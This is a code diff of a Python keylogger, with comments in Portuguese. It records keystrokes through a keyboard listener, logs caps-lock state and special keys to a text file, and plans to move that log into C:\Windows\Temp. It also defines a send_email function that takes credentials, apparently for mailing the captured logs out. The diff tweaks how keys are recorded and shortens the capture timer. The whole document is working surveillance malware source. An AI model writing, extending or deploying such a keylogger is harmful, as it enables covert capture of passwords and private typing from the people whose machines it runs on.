@@ -12,7 +12,6 @@ def get_capslock_state():
     return hllDll.GetKeyState(VK_CAPITAL)
 
 
-# Trocar para C:\Windows\Temp\logs.json
 def update_txt_file(key_list):
     with open(file_path, 'a') as file:
         print(key_list[-1])
@@ -27,12 +26,8 @@ def update_txt_file(key_list):
             file.write(' ')
         elif key_list[-1][
                 0:
-                3] == 'Key.enter':  # Caso especial para ficar claro o uso do Enter
-            file.write('ENTER')
-        elif key_list[-1][
-                0:
                 3] == 'Key':  # Ignora o restante das teclas que começam com Key
-            do_nothing = 1
+            file.write('(' + key_list[-1] + ')')
         else:  # Se for uma letra ou número, adiciona o caractere normalmente
             print('entrou no else')
             print('caps lock state: ', caps_lock_state)
@@ -88,7 +83,7 @@ def send_email(email, password, receiver, subject='(no subject)'):
 
 key_list = []
 x = False  # Value to if held
-file_path = 'logs.txt'
+file_path = 'logs.txt'  # Trocar para C:\Windows\Temp\logs.json
 do_nothing = 1
 
 print(
@@ -96,7 +91,7 @@ print(
 )
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    Timer(30, listener.stop).start()
+    Timer(8, listener.stop).start()
     listener.join()
     print("[-] Keylogger finalizado!")
 
